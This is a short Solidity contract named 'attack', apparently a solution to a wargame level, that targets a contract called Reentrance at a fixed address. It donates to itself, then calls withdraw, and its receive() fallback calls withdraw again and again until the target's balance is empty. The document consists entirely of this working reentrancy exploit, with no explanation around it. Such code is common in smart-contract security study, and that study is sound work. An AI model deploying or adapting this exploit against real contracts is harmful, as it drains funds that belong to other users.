contract attack {
  Reentrance originalContract = Reentrance(0xf678057EB5c513313353543b44011c1fe5eecb66);
  uint public amount = 0.0001 ether;
  
  constructor() public payable {
  
  }

  function donateToSelf() public {
    originalContract.donate{value: amount, gas: 400000}(address(this));
  }


  function start() public {
    originalContract.withdraw{gas: 400000}(amount);
  }

  receive() external payable {
     if (address(originalContract).balance != 0 ) {
        originalContract.withdraw{gas: 400000}(amount);
    }
  }
}
